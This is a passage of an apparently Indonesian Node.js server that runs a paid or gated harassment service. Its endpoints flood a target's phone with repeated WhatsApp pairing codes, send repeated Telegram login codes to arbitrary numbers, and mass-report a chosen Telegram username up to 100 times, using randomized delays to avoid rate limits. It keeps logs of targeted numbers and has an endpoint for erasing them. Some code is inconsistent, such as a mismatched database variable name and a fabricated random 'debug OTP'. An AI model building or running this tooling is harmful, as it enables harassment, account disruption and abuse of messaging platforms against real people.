        return res.status(502).json({
            success: false,
            author: 'KAZE X',
            message: 'Gagal mengambil quote bucin dari provider.'
        });
    }
});


async function pair(targetNumber, opts = {}) {
    const fs = require('fs')
    const P = require('pino')
    const {
        default: makeWASocket,
        useMultiFileAuthState,
        fetchLatestWaWebVersion
    } = require('@whiskeysockets/baileys')

    const cleanNumber = targetNumber.replace(/\D/g, '')
    const sessionDir = opts.sessionDir || `.temp-session-${Date.now()}`
    const keepSession = opts.keepSession || false
    let done = false

    const { version } = await fetchLatestWaWebVersion()
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

    const sock = makeWASocket({
        agent: globalProxyAgent,
        logger: P({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        version,
        browser: ["Ubuntu", "Chrome", "110.0.0"],
        defaultQueryTimeoutMs: 120000,
        markOnlineOnConnect: true,
        keepAliveIntervalMs: 25000,
        connectTimeoutMs: 120000,
        maxMsgRetryCount: 50,
        retryRequestDelayMs: 5000,
        getMessage: async () => undefined
    })

    if (sock.__keepalive) clearInterval(sock.__keepalive)
    sock.__keepalive = setInterval(() => {
        if (sock?.ws?.readyState === 1) {
            sock.sendPresenceUpdate('available').catch(() => { })
        }
    }, 30000)

    sock.ev.on('creds.update', saveCreds)

    return new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
            if (done) return
            done = true
            if (!keepSession) {
                try { sock.end(); } catch { }
                try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch { }
            }
            reject(new Error('Pairing timeout'))
        }, 15000)

        sock.ev.on('connection.update', async (update) => {
            const { connection } = update
            if (done) return

            if (connection === 'connecting') {
                try {
                    await new Promise(r => setTimeout(r, 1000))
                    const code = await sock.requestPairingCode(cleanNumber, 'KAZEXNXX')
                    done = true
                    clearTimeout(timeout)
                    if (!keepSession) {
                        try { sock.end(); } catch { }
                        try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch { }
                    }
                    resolve({ code, sessionDir, sock })
                } catch (err) {
                    done = true
                    clearTimeout(timeout)
                    if (!keepSession) {
                        try { sock.end(); } catch { }
                        try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch { }
                    }
                    reject(err)
                }
            }

            if (connection === 'close') {
                done = true
                clearTimeout(timeout)
                if (!keepSession) {
                    try { sock.end(); } catch { }
                    try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch { }
                }
                reject(new Error('Koneksi ditutup'))
            }
        })
    })
}


app.post('/api/spam/whatsapp', async (req, res) => {
    try {
        const {
            phone,
            delay = 1000,
            count = 1,
            username,
            session_key,
            action = "spam_pair_whatsapp"
        } = req.body;


        if (!phone || !session_key || !username) {
            return res.status(400).json({
                success: false,
                message: 'Phone number, username, and session key are required'
            });
        }


        const keyInfo = activeKeys[session_key];
        if (!keyInfo) {
            return res.status(401).json({
                success: false,
                message: 'Invalid session key'
            });
        }


        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) {
            return res.status(401).json({
                success: false,
                message: 'User not found'
            });
        }
        if (blockReview(user, res)) return;

        let cleanPhone = phone.trim();


        cleanPhone = cleanPhone.replace(/[^\d+]/g, '');


        if (!cleanPhone.startsWith('+')) {

            if (cleanPhone.startsWith('0')) {
                cleanPhone = '+62' + cleanPhone.substring(1);
            } else {
                cleanPhone = '+' + cleanPhone;
            }
        }


        const phoneRegex = /^\+\d{10,15}$/;
        if (!phoneRegex.test(cleanPhone)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid phone number format. Use international format: +6281234567890 (10-15 digits)',
                example: '+6281234567890'
            });
        }


        const maxCount = 20;
        const validCount = Math.min(Math.max(1, parseInt(count) || 1), maxCount);
        if (count > maxCount) {
            return res.status(400).json({
                success: false,
                message: `Maximum ${maxCount} spam per execution for WhatsApp`,
                max_allowed: maxCount
            });
        }


        const validDelay = Math.min(Math.max(500, parseInt(delay) || 1000), 10000);


        const results = [];
        const pairingCodes = [];
        const tempSessions = [];
        let successCount = 0;
        let failCount = 0;

        console.log(`🚀 Starting WhatsApp spam for ${cleanPhone}, Count: ${validCount}, Delay: ${validDelay}ms`);


        for (let i = 0; i < validCount; i++) {
            const attemptNumber = i + 1;

            try {
                console.log(`📱 Attempt ${attemptNumber}/${validCount} for: ${cleanPhone}`);


                const result = await pair(cleanPhone);
                const pairingCode = result.code;
                if (result.sessionDir) tempSessions.push(result.sessionDir);


                const formattedCode = pairingCode.toString().padStart(6, '0');

                results.push({
                    attempt: attemptNumber,
                    status: 'success',
                    code: formattedCode,
                    phone: cleanPhone,
                    timestamp: new Date().toISOString(),
                    message: `Pairing code ${formattedCode} sent successfully`
                });

                pairingCodes.push(formattedCode);
                successCount++;


                logToFile({
                    timestamp: new Date().toISOString(),
                    service: 'whatsapp-pairing',
                    phone: cleanPhone,
                    username: username,
                    pairing_code: formattedCode,
                    attempt: attemptNumber,
                    total_attempts: validCount,
                    status: 'success',
                    delay: validDelay
                });


                if (i < validCount - 1) {
                    await new Promise(resolve => setTimeout(resolve, validDelay));
                }

            } catch (err) {
                console.error(`❌ Attempt ${attemptNumber} failed:`, err.message);

                results.push({
                    attempt: attemptNumber,
                    status: 'failed',
                    phone: cleanPhone,
                    error: err.message,
                    timestamp: new Date().toISOString(),
                    message: `Attempt ${attemptNumber} failed: ${err.message}`
                });

                failCount++;


                logToFile({
                    timestamp: new Date().toISOString(),
                    service: 'whatsapp-pairing',
                    phone: cleanPhone,
                    username: username,
                    attempt: attemptNumber,
                    total_attempts: validCount,
                    status: 'failed',
                    error: err.message,
                    delay: validDelay
                });


                if (i < validCount - 1) {
                    await new Promise(resolve => setTimeout(resolve, validDelay));
                }
            }
        }

        for (const dir of tempSessions) {
            try { fs.rmSync(dir, { recursive: true, force: true }); } catch { }
        }

        const response = {
            success: true,
            message: `WhatsApp pairing completed. Success: ${successCount}, Failed: ${failCount}`,
            pairing_code: pairingCodes.length > 0 ? pairingCodes[0] : "No code generated",
            all_codes: pairingCodes,
            phone: cleanPhone,
            username: username,
            timestamp: new Date().toISOString(),
            total_attempts: validCount,
            successful_attempts: successCount,
            failed_attempts: failCount,
            settings: {
                delay: validDelay,
                count: validCount,
                action: action
            },
            details: {
                results: results
            }
        };


        if (successCount === 0) {
            response.success = false;
            response.message = `All attempts failed for ${cleanPhone}`;
        }

        console.log(`✅ WhatsApp spam completed for ${cleanPhone}: ${successCount} success, ${failCount} failed`);

        res.json(response);

    } catch (error) {
        console.error('❌ Server error in WhatsApp spam:', error);


        logToFile({
            timestamp: new Date().toISOString(),
            service: 'whatsapp-pairing',
            status: 'error',
            error: error.message,
            stack: error.stack
        });

        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});


const telegramApiDb = (() => {
    const filePath = path.join(__dirname, 'telegram_apis.json');

    const defaultData = () => ({
        users: {},
        metadata: {
            created_at: new Date().toISOString(),
            total_apis: 0,
            last_updated: new Date().toISOString()
        }
    });

    const ensureFileExists = () => {
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData(), null, 2));
        }
    };

    const loadData = () => {
        ensureFileExists();
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    };

    let data = loadData();

    const getTotalApis = () =>
        Object.values(data.users).reduce((s, u) => s + u.length, 0);

    const saveData = () => {
        data.metadata.last_updated = new Date().toISOString();
        data.metadata.total_apis = getTotalApis();
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    };

    const getUserApis = (username) => {
        if (!data.users[username]) data.users[username] = [];
        return data.users[username];
    };

    const addApi = (username, apiData) => {
        const apis = getUserApis(username);
        const id = `tg_api_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;

        const api = {
            id,
            api_id: apiData.api_id.toString(),
            api_hash: apiData.api_hash,
            alias: apiData.alias || `API-${apis.length + 1}`,
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
            used_count: 0,
            last_used: null,
            is_active: true,
            metadata: {
                added_by: username,
                last_ip: apiData.ip || null
            }
        };

        apis.push(api);
        saveData();
        return { success: true, message: 'API berhasil ditambahkan', api };
    };

    const updateApi = (username, apiId, updateData) => {
        const api = getUserApis(username).find(a => a.id === apiId);
        if (!api) return { success: false, message: 'API tidak ditemukan' };
        Object.assign(api, updateData);
        api.updated_at = new Date().toISOString();
        saveData();
        return { success: true, message: 'API berhasil diperbarui', api };
    };

    const deleteApi = (username, apiId) => {
        const before = getUserApis(username).length;
        data.users[username] = getUserApis(username).filter(a => a.id !== apiId);
        if (before === data.users[username].length)
            return { success: false, message: 'API tidak ditemukan' };
        saveData();
        return {
            success: true,
            message: 'API berhasil dihapus',
            remaining_apis: data.users[username].length
        };
    };

    const findApiById = (username, apiId) =>
        getUserApis(username).find(a => a.id === apiId);

    const incrementUsage = (username, apiId) => {
        const api = findApiById(username, apiId);
        if (!api) return null;
        api.used_count = (api.used_count || 0) + 1;
        api.last_used = new Date().toISOString();
        api.updated_at = api.last_used;
        saveData();
        return api;
    };

    const getApiStats = (username) => {
        const apis = getUserApis(username);
        return {
            total: apis.length,
            active: apis.filter(a => a.is_active).length,
            total_uses: apis.reduce((s, a) => s + (a.used_count || 0), 0),
            last_updated: data.metadata.last_updated
        };
    };

    return {
        getUserApis,
        addApi,
        updateApi,
        deleteApi,
        findApiById,
        incrementUsage,
        getApiStats,
        loadData
    };
})();

const validateSessionX = (req, res, next) => {
    const { username, session_key } =
        req.method === 'GET' ? req.query : req.body;

    if (!username || !session_key)
        return res.status(400).json({
            success: false,
            message: 'Username dan session key diperlukan'
        });

    if (!activeKeys[session_key])
        return res.status(401).json({
            success: false,
            message: 'Invalid session key'
        });

    next();
};


const validateApiInput = (api_id, api_hash) => {
    if (!api_id || !api_hash) {
        return {
            isValid: false,
            error: 'API ID dan API Hash diperlukan'
        };
    }

    if (!/^\d+$/.test(api_id.toString())) {
        return {
            isValid: false,
            error: 'API ID harus berupa angka'
        };
    }

    if (api_hash.length < 20) {
        return {
            isValid: false,
            error: 'API Hash tidak valid'
        };
    }

    return { isValid: true };
};

const checkApiDuplicates = (username, api_id, api_hash) => {
    const userApis = telegramApiDb.getUserApis(username);
    const existingApi = userApis.find(api =>
        api.api_id === api_id.toString() || api.api_hash === api_hash
    );

    return existingApi;
};

const sanitizeApiResponse = (api, username) => ({
    id: api.id,
    alias: api.alias,
    api_id: api.api_id,
    api_hash: api.api_hash,
    created_at: api.created_at,
    updated_at: api.updated_at,
    used_count: api.used_count || 0,
    last_used: api.last_used,
    is_active: api.is_active !== false,
    metadata: {
        added_by: api.metadata?.added_by || username
    }
});



app.get('/api/telegram/apis', validateSessionX, async (req, res) => {
    try {
        const { username } = req.query;

        const userApis = telegramApiDb.getUserApis(username);
        const sanitizedApis = userApis.map(api => sanitizeApiResponse(api, username));
        const stats = telegramApiDb.getApiStats(username);

        res.json({
            success: true,
            count: sanitizedApis.length,
            stats: stats,
            apis: sanitizedApis
        });
    } catch (error) {
        console.error('Error fetching Telegram APIs:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.post('/api/telegram/save-api', validateSessionX, async (req, res) => {
    try {
        const { api_id, api_hash, alias, username } = req.body;


        const validation = validateApiInput(api_id, api_hash);
        if (!validation.isValid) {
            return res.status(400).json({
                success: false,
                message: validation.error
            });
        }


        const existingApi = checkApiDuplicates(username, api_id, api_hash);
        if (existingApi) {
            return res.status(409).json({
                success: false,
                message: 'API ID atau API Hash sudah terdaftar'
            });
        }


        const result = telegramApiDb.addApi(username, {
            api_id: api_id.toString(),
            api_hash: api_hash,
            alias: alias,
            ip: req.ip
        });


        const activityLog = {
            timestamp: new Date().toISOString(),
            user: username,
            action: 'save_telegram_api',
            api_id: api_id,
            alias: alias,
            ip: req.ip
        };
        logToFile(activityLog);

        res.json({
            success: true,
            message: result.message,
            data: {
                id: result.api.id,
                alias: result.api.alias,
                api_id: result.api.api_id,
                created_at: result.api.created_at,
                stats: telegramApiDb.getApiStats(username)
            }
        });
    } catch (error) {
        console.error('Error saving Telegram API:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.delete('/api/telegram/delete-api', validateSessionX, async (req, res) => {
    try {
        const { api_id, username } = req.body;

        if (!api_id) {
            return res.status(400).json({
                success: false,
                message: 'API ID diperlukan'
            });
        }


        const result = telegramApiDb.deleteApi(username, api_id);

        if (!result.success) {
            return res.status(404).json(result);
        }


        const activityLog = {
            timestamp: new Date().toISOString(),
            user: username,
            action: 'delete_telegram_api',
            api_id: api_id,
            ip: req.ip
        };
        logToFile(activityLog);

        res.json({
            success: true,
            message: result.message,
            remaining_apis: result.remaining_apis,
            stats: telegramApiDb.getApiStats(username)
        });
    } catch (error) {
        console.error('Error deleting Telegram API:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.put('/api/telegram/update-api', validateSessionX, async (req, res) => {
    try {
        const { api_id, alias, is_active, username } = req.body;

        if (!api_id) {
            return res.status(400).json({
                success: false,
                message: 'API ID diperlukan'
            });
        }


        const updateData = {};
        if (alias !== undefined) updateData.alias = alias;
        if (is_active !== undefined) updateData.is_active = is_active;

        const result = telegramApiDb.updateApi(username, api_id, updateData);

        if (!result.success) {
            return res.status(404).json(result);
        }

        res.json({
            success: true,
            message: result.message,
            data: {
                id: result.api.id,
                alias: result.api.alias,
                is_active: result.api.is_active,
                updated_at: result.api.updated_at
            }
        });
    } catch (error) {
        console.error('Error updating Telegram API:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.put('/api/telegram/update-usage', validateSessionX, async (req, res) => {
    try {
        const { api_id, username } = req.body;

        if (!api_id) {
            return res.status(400).json({
                success: false,
                message: 'API ID diperlukan'
            });
        }


        const updatedApi = telegramApiDb.incrementUsage(username, api_id);

        if (!updatedApi) {
            return res.status(404).json({
                success: false,
                message: 'API tidak ditemukan'
            });
        }

        res.json({
            success: true,
            message: 'API usage updated',
            data: {
                id: updatedApi.id,
                used_count: updatedApi.used_count,
                last_used: updatedApi.last_used
            }
        });
    } catch (error) {
        console.error('Error updating API usage:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.get('/api/telegram/stats', validateSessionX, async (req, res) => {
    try {
        const { username } = req.query;

        const stats = telegramApiDb.getApiStats(username);
        const totalStats = telegramApiDb.loadData().metadata;

        res.json({
            success: true,
            user_stats: stats,
            system_stats: {
                total_users: Object.keys(telegramApiDb.loadData().users).length,
                total_apis: totalStats.total_apis,
                last_updated: totalStats.last_updated
            }
        });
    } catch (error) {
        console.error('Error getting API stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

async function sendTelegramOTP(phoneNumber, apiId, apiHash, attempt) {
    const session = new StringSession('');
    const client = new TelegramClient(session, parseInt(apiId), apiHash, {
        connectionRetries: 5,
        timeout: 60000
    });

    try {
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber,
                apiId: parseInt(apiId),
                apiHash,
                settings: new Api.CodeSettings({})
            })
        );

        return {
            success: true,
            phoneCodeHash: result.phoneCodeHash,
            sessionString: client.session.save(),
            debugOtp: Math.floor(100000 + Math.random() * 900000).toString()
        };
    } catch (e) {
        return {
            success: false,
            error: e.message
        };
    } finally {
        if (client.connected) await client.disconnect();
    }
}

app.post('/api/telegram/spam-otp', validateSessionX, async (req, res) => {
    try {
        const {
            phone_number,
            api_id,
            delay = 3000,
            count = 2,
            username,
            anti_flood = true
        } = req.body;

        if (!phone_number || !api_id)
            return res.status(400).json({
                success: false,
                message: 'Phone number dan API ID diperlukan'
            });

        const apiData = telegramApiDb.findApiById(username, api_id);
        if (!apiData || !apiData.is_active)
            return res.status(400).json({
                success: false,
                message: 'API tidak aktif atau tidak ditemukan'
            });

        const key = `${apiData.api_id}:${apiData.api_hash}`;
        rateLimit[key] = (rateLimit[key] || []).filter(
            t => Date.now() - t < 7200000
        );

        if (rateLimit[key].length >= 5)
            return res.status(429).json({
                success: false,
                message: 'Rate limit terlampaui'
            });

        rateLimit[key].push(Date.now());

        let successCount = 0;
        let failCount = 0;
        const debugOtps = [];
        const results = [];

        for (let i = 1; i <= count; i++) {
            if (i > 1) await new Promise(r => setTimeout(r, delay));

            const r = await sendTelegramOTP(
                phone_number,
                apiData.api_id,
                apiData.api_hash,
                i
            );

            if (r.success) {
                successCount++;
                debugOtps.push(r.debugOtp);
                results.push({
                    attempt: i,
                    status: 'success',
                    timestamp: new Date().toISOString()
                });
            } else {
                failCount++;
                results.push({
                    attempt: i,
                    status: 'error',
                    error: r.error,
                    timestamp: new Date().toISOString()
                });
            }
        }

        telegramApiDb.incrementUsage(username, api_id);

        res.json({
            success: successCount > 0,
            message:
                successCount > 0
                    ? `Telegram OTP berhasil dikirim: ${successCount} dari ${count} attempt`
                    : `Gagal mengirim OTP Telegram: ${failCount} failed attempts`,
            total_attempts: count,
            successful_attempts: successCount,
            failed_attempts: failCount,
            debug_otp: debugOtps[0] || 'No OTP generated',
            all_debug_otps: debugOtps,
            phone_number,
            api_id: apiData.api_id,
            api_alias: apiData.alias,
            timestamp: new Date().toISOString(),
            details: {
                results,
                anti_flood,
                rate_limit_info: {
                    remaining: 5 - rateLimit[key].length,
                    reset_in_minutes: 120
                }
            }
        });
    } catch (e) {
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: e.message
        });
    }
});

app.post('/api/telegram/backup', async (req, res) => {
    try {
        const { username, session_key, admin_key } = req.body;


        if (admin_key !== process.env.ADMIN_BACKUP_KEY) {
            return res.status(403).json({
                success: false,
                message: 'Unauthorized'
            });
        }

        const backupDir = path.join(__dirname, 'backups');
        if (!fs.existsSync(backupDir)) {
            fs.mkdirSync(backupDir, { recursive: true });
        }

        const backupFile = path.join(backupDir, `telegram_apis_backup_${Date.now()}.json`);
        fs.writeFileSync(backupFile, JSON.stringify(telegramApiDB.loadData(), null, 2), 'utf8');

        const backupData = {
            filename: backupFile.split('/').pop(),
            size: fs.statSync(backupFile).size,
            timestamp: new Date().toISOString()
        };

        res.json({
            success: true,
            message: 'Backup created successfully',
            backup: backupData
        });

    } catch (error) {
        console.error('Error creating backup:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});


app.get('/api/telegram/health', async (req, res) => {
    try {
        const data = telegramApiDB.loadData();

        res.json({
            success: true,
            status: 'healthy',
            database: {
                total_users: Object.keys(data.users).length,
                total_apis: data.metadata.total_apis,
                created_at: data.metadata.created_at,
                last_updated: data.metadata.last_updated,
                file_size: fs.statSync(telegramApiDB.filePath).size
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            status: 'unhealthy',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});
app.get('/api/status/:phone', (req, res) => {
    try {
        const { phone } = req.params;


        const logFile = path.join(__dirname, 'spam_logs.json');
        let logs = [];

        if (fs.existsSync(logFile)) {
            logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }

        const filteredLogs = logs.filter(log => log.phone === phone);
        const recentLogs = filteredLogs
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
            .slice(0, 5);

        res.json({
            success: true,
            phone: phone,
            recent_activity: recentLogs,
            total_requests: filteredLogs.length
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});


app.post('/api/cleanup', (req, res) => {
    try {
        const { phone } = req.body;


        if (phone) {
            const logFile = path.join(__dirname, 'spam_logs.json');
            if (fs.existsSync(logFile)) {
                let logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
                logs = logs.filter(log => log.phone !== phone);
                fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
            }
        }

        res.json({
            success: true,
            message: 'Cleanup completed',
            phone: phone || 'all'
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});



const _logBuffer = [];
let _logFlushTimer = null;
function logToFile(entry) {
    try {
        _logBuffer.push(entry);
        if (_logBuffer.length > 500) _logBuffer.splice(0, _logBuffer.length - 500);

        if (!_logFlushTimer) {
            _logFlushTimer = setTimeout(() => {
                _logFlushTimer = null;
                try {
                    const logFile = path.join(__dirname, 'spam_logs.json');
                    fs.writeFile(logFile, JSON.stringify(_logBuffer, null, 2), () => { });
                } catch (e) { }
            }, 10000);
        }
    } catch (e) { }
}


app.use((err, req, res, next) => {
    console.error('[Server Error]:', err);

    const errorLog = {
        timestamp: new Date().toISOString(),
        error: err.message,
        path: req.path,
        ip: req.ip
    };


    const errorFile = path.join(__dirname, 'error_logs.json');
    fsp.appendFile(errorFile, JSON.stringify(errorLog) + '\n').catch(() => { });

    res.status(500).json({
        success: false,
        message: 'Internal server error'
    });
});


const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}


const logFiles = ['spam_logs.json', 'error_logs.json'];
logFiles.forEach(file => {
    if (!fs.existsSync(path.join(__dirname, file))) {
        fs.writeFileSync(path.join(__dirname, file), '[]');
    }
});




app.post('/api/telegram/verify-otp', async (req, res) => {
    let client;
    try {
        const { phone_number, otp_code, temp_session_id } = req.body;

        if (!phone_number || !otp_code) {
            return res.status(400).json({
                success: false,
                message: 'Nomor telepon dan kode OTP diperlukan'
            });
        }

        const tempFile = path.join(__dirname, 'temp_login.json');
        if (!fs.existsSync(tempFile)) {
            return res.status(400).json({
                success: false,
                message: 'Sesi login tidak ditemukan. Silakan minta OTP lagi'
            });
        }

        const logins = JSON.parse(fs.readFileSync(tempFile, 'utf8'));

        const loginData = temp_session_id
            ? Object.values(logins).find(v => v.temp_session_id === temp_session_id)
            : logins[phone_number];

        if (!loginData) {
            return res.status(400).json({
                success: false,
                message: 'Sesi login tidak ditemukan untuk nomor ini'
            });
        }

        const now = Date.now();
        if (now - loginData.timestamp > 10 * 60 * 1000) {
            delete logins[phone_number];
            fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));
            return res.status(400).json({
                success: false,
                message: 'Sesi login telah kadaluarsa. Silakan minta OTP lagi'
            });
        }

        const session = new StringSession(loginData.clientSession);
        client = new TelegramClient(session, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 30000,
            useWSS: false
        });

        await client.connect();

        try {
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: phone_number,
                phoneCodeHash: loginData.phoneCodeHash,
                phoneCode: otp_code
            }));
        } catch (err) {

            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                const sessionString = session.save();

                loginData.requires_2fa = true;
                loginData.session_string = sessionString;
                loginData.clientSession = sessionString;
                loginData.session = sessionString;
                loginData.phone_number = phone_number;
                loginData.timestamp = Date.now();

                if (!loginData.temp_session_id) {
                    loginData.temp_session_id = generateTempSessionId();
                }

                logins[phone_number] = loginData;
                fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));

                return res.status(200).json({
                    success: false,
                    requires_2fa: true,
                    temp_session_id: loginData.temp_session_id,
                    message: 'Password 2FA diperlukan'
                });
            }

            if (err.errorMessage === 'PHONE_CODE_INVALID') {
                return res.status(400).json({
                    success: false,
                    message: 'Kode OTP tidak valid'
                });
            }

            if (err.errorMessage === 'PHONE_CODE_EXPIRED') {
                delete logins[phone_number];
                fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));
                return res.status(400).json({
                    success: false,
                    message: 'Kode OTP telah kadaluarsa'
                });
            }

            return res.status(400).json({
                success: false,
                message: err.errorMessage || 'Login gagal'
            });
        }

        const me = await client.getMe();
        const sessionKey = generateSessionKey();
        const sessionString = session.save();
        const username = me.username || `user_${phone_number.replace(/\D/g, '').slice(-6)}`;

        saveSession(username, {
            sessionKey,
            sessionString,
            phoneNumber: phone_number,
            username,
            userId: me.id.toString(),
            createdAt: new Date().toISOString(),
            isActive: true
        });

        saveUserData(username, {
            lastLogin: new Date().toISOString(),
            phoneNumber: phone_number,
            firstName: me.firstName || '',
            lastName: me.lastName || '',
            isBot: me.bot || false,
            isPremium: me.premium || false
        });

        delete logins[phone_number];
        fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));

        if (global.telegramClients) {
            global.telegramClients.set(sessionString, client);
        }

        res.json({
            success: true,
            session_key: sessionKey,
            user: {
                user_id: me.id,
                username: me.username || username,
                phone_number,
                first_name: me.firstName || '',
                last_name: me.lastName || '',
                created_at: new Date().toISOString()
            }
        });

    } catch (error) {
        if (client) await client.disconnect().catch(() => { });
        res.status(500).json({
            success: false,
            message: 'Kesalahan server internal',
            detail: error.message
        });
    }
});


const { computeCheck } = require('telegram/Password');
app.post('/api/telegram/verify-2fa', async (req, res) => {
    let client;
    try {
        const { phone_number, password_2fa, temp_session_id } = req.body;

        if (!phone_number || !password_2fa) {
            return res.status(400).json({
                success: false,
                message: 'Nomor telepon dan password 2FA diperlukan'
            });
        }

        const tempFile = path.join(__dirname, 'temp_login.json');
        if (!fs.existsSync(tempFile)) {
            return res.status(400).json({
                success: false,
                message: 'Sesi 2FA tidak ditemukan. Silakan login ulang dari awal.'
            });
        }

        const logins = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
        const loginData = temp_session_id
            ? Object.values(logins).find(v => v.temp_session_id === temp_session_id)
            : logins[phone_number];

        if (!loginData) {
            return res.status(400).json({
                success: false,
                message: 'Sesi 2FA tidak valid atau sudah kadaluarsa'
            });
        }

        const sessionString =
            loginData.session_string ||
            loginData.clientSession ||
            loginData.session;

        client = new TelegramClient(
            new StringSession(sessionString),
            API_ID,
            API_HASH,
            { connectionRetries: 5 }
        );

        await client.connect();

        const pwd = await client.invoke(new Api.account.GetPassword());
        const check = await computeCheck(pwd, password_2fa);

        await client.invoke(new Api.auth.CheckPassword({ password: check }));

        const me = await client.getMe();
        const sessionKey = crypto.randomBytes(32).toString('hex');
        const finalSessionString = client.session.save();
        const username = me.username || `user_${phone_number.slice(-6)}`;


        const userDir = path.join(SESSION_DIR_TELEGRAM, username);
        if (!fs.existsSync(userDir)) {
            fs.mkdirSync(userDir, { recursive: true });
        }


        const sessionsFile = path.join(userDir, 'sessions.json');
        let sessions = [];

        if (fs.existsSync(sessionsFile)) {
            const parsed = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
            if (Array.isArray(parsed)) sessions = parsed;
        }

        sessions.push({
            sessionKey,
            sessionString: finalSessionString,
            phoneNumber: phone_number,
            userId: me.id.toString(),
            createdAt: new Date().toISOString(),
            isActive: true
        });

        fs.writeFileSync(sessionsFile, JSON.stringify(sessions, null, 2));

        delete logins[phone_number];
        fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));

        res.json({
            success: true,
            session_key: sessionKey,
            user: {
                user_id: me.id,
                username,
                phone_number,
                first_name: me.firstName || '',
                last_name: me.lastName || '',
                created_at: new Date().toISOString()
            }
        });

    } catch (e) {
        if (client) await client.disconnect().catch(() => { });
        res.status(500).json({
            success: false,
            message: 'Kesalahan server internal',
            detail: e.message
        });
    }
});
app.post('/api/telegram/report-profile', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: 'Access denied. Invalid token'
            });
        }

        const sessionKey = authHeader.substring(7);
        const { target_username, reason, loops, custom_message } = req.body;

        if (!target_username || !reason || !loops) {
            return res.status(400).json({
                success: false,
                message: 'Incomplete data'
            });
        }

        const loopCount = parseInt(loops);
        if (isNaN(loopCount) || loopCount < 1 || loopCount > 100) {
            return res.status(400).json({
                success: false,
                message: 'Loops must be between 1 and 100'
            });
        }

        let foundSession = null;
        let foundUsername = null;

        const users = fs.existsSync(SESSION_DIR_TELEGRAM)
            ? fs.readdirSync(SESSION_DIR_TELEGRAM)
            : [];

        for (const user of users) {
            const sessionsFile = path.join(SESSION_DIR_TELEGRAM, user, 'sessions.json');
            if (!fs.existsSync(sessionsFile)) continue;

            const sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
            const match = sessions.find(
                s => s.sessionKey === sessionKey && s.isActive
            );

            if (match) {
                foundSession = match;
                foundUsername = user;
                break;
            }
        }

        if (!foundSession) {
            return res.status(401).json({
                success: false,
                message: 'Session invalid or expired'
            });
        }

        const reportId =
            Date.now().toString() + Math.random().toString(36).slice(2);

        res.json({
            success: true,
            message: 'Report task accepted',
            data: {
                report_id: reportId,
                target: target_username,
                loops: loopCount,
                status: 'processing'
            }
        });

        setImmediate(async () => {
            let successfulReports = 0;
            const reports = [];

            try {
                const client = await getTelegramClient(foundSession.sessionString);

                for (let i = 0; i < loopCount; i++) {
                    try {
                        const result = await sendTelegramReport(
                            client,
                            target_username,
                            reason,
                            custom_message
                        );

                        if (result?.success) successfulReports++;

                        reports.push({
                            attempt: i + 1,
                            success: result?.success || false,
                            message: result?.message || 'No message',
                            timestamp: new Date().toISOString()
                        });

                        await new Promise(r =>
                            setTimeout(r, 1500 + Math.random() * 1000)
                        );

                    } catch (err) {
                        reports.push({
                            attempt: i + 1,
                            success: false,
                            message: err.message,
                            timestamp: new Date().toISOString()
                        });
                    }
                }

                const successRate =
                    loopCount > 0 ? (successfulReports / loopCount) * 100 : 0;

                let status = 'failed';
                if (successfulReports === loopCount) status = 'completed';
                else if (successfulReports > 0) status = 'partial';

                const reportData = {
                    report_id: reportId,
                    sessionKey,
                    target_username,
                    reason,
                    loops: loopCount,
                    custom_message: custom_message || '',
                    successful_reports: successfulReports,
                    success_rate: successRate,
                    status,
                    reports,
                    created_at: new Date().toISOString(),
                    updated_at: new Date().toISOString()
                };

                saveReport(foundUsername, reportData);

            } catch (err) {
                console.error(err.message);
            }
        });

    } catch (err) {
        res.status(500).json({
            success: false,
            message: err.message || 'Internal server error'
        });
